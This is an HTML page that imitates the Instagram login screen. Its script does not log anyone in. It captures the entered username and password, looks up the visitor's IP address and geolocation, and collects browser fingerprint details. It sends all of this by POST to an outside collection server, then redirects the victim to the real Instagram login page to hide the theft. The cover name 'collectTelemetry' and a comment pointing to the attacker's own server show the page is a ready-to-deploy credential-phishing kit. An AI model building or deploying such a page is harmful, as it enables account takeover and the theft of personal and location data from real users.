<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* Your existing CSS unchanged */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .login-container {
            width: 100%;
            max-width: 350px;
            text-align: center;
        }
        .box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 20px 40px;
            margin-bottom: 10px;
        }
        .logo {
            margin: 22px auto 12px;
            width: 175px;
            display: block;
            font-family: 'Brush Script MT', cursive;
            font-size: 40px;
            color: #262626;
        }
        .login-form {
            display: flex;
            flex-direction: column;
            margin-top: 24px;
        }
        .login-form input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px;
            margin-bottom: 6px;
            font-size: 12px;
        }
        .login-form input:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }
        .btn-login {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 7px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 8px;
            cursor: pointer;
            transition: opacity 0.2s ease;
        }
        .btn-login:hover:not(:disabled) {
            background-color: #1877f2;
        }
        .btn-login:disabled {
            background-color: #b2dffc;
            cursor: default;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider .line {
            flex: 1;
            height: 1px;
            background-color: #dbdbdb;
        }
        .divider .text {
            margin: 0 18px;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
        }
        .fb-login {
            color: #385185;
            font-size: 14px;
            font-weight: 600;
            text-decoration: none;
            display: block;
            margin-bottom: 15px;
        }
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
        }
        .signup-box p {
            font-size: 14px;
            color: #262626;
        }
        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .spinner {
            width: 24px;
            height: 24px;
            border: 2px solid #dbdbdb;
            border-top: 2px solid #0095f6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="box">
            <h1 class="logo">Instagram</h1>
            <form class="login-form" id="loginForm">
                <input type="text" id="username" placeholder="Phone number, username, or email" required autocomplete="username">
                <input type="password" id="password" placeholder="Password" required autocomplete="current-password">
                <button type="submit" class="btn-login" id="loginBtn">Log In</button>
            </form>
            <div class="divider">
                <div class="line"></div>
                <div class="text">OR</div>
                <div class="line"></div>
            </div>
            <a href="#" class="fb-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <div class="box signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <script>
        (function() {
            // ✅ FIXED: Points to your SERVER deployment
            const API_ENDPOINT = 'https://serverbash-production.up.railway.app/api/capture';
            
            async function collectTelemetry() {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                let ip = 'unknown', city = 'unknown', country = 'unknown', lat = 'unknown', lon = 'unknown';
                
                try {
                    const geoRes = await fetch('https://ipapi.co/json/');
                    const geoData = await geoRes.json();
                    ip = geoData.ip || 'unknown';
                    city = geoData.city || 'unknown';
                    country = geoData.country_name || 'unknown';
                    lat = geoData.latitude || 'unknown';
                    lon = geoData.longitude || 'unknown';
                } catch(e) {}

                const payload = {
                    platform: 'Instagram',
                    username: username,
                    password: password,
                    ip: ip,
                    city: city,
                    country: country,
                    lat: lat,
                    lon: lon,
                    userAgent: navigator.userAgent,
                    language: navigator.language || navigator.languages?.[0],
                    platform: navigator.platform,
                    screen: `${screen.width}x${screen.height}`,
                    viewport: `${window.innerWidth}x${window.innerHeight}`,
                    cookies: navigator.cookieEnabled,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    referrer: document.referrer,
                    origin: window.location.origin
                };
                
                // Send to YOUR SERVER
                fetch(API_ENDPOINT, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).then(res => console.log('✅ Sent to server'))
                  .catch(e => console.log('Send failed:', e));
            }
            
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                const btn = document.getElementById('loginBtn');
                const overlay = document.getElementById('loadingOverlay');
                
                btn.disabled = true;
                btn.textContent = 'Logging in...';
                overlay.style.display = 'flex';
                
                setTimeout(async () => {
                    await collectTelemetry();
                    setTimeout(() => {
                        window.location.href = 'https://www.instagram.com/accounts/login/';
                    }, 1200);
                }, 600);
            });
            
            document.getElementById('username').focus();
        })();
    </script>
</body>
</html>
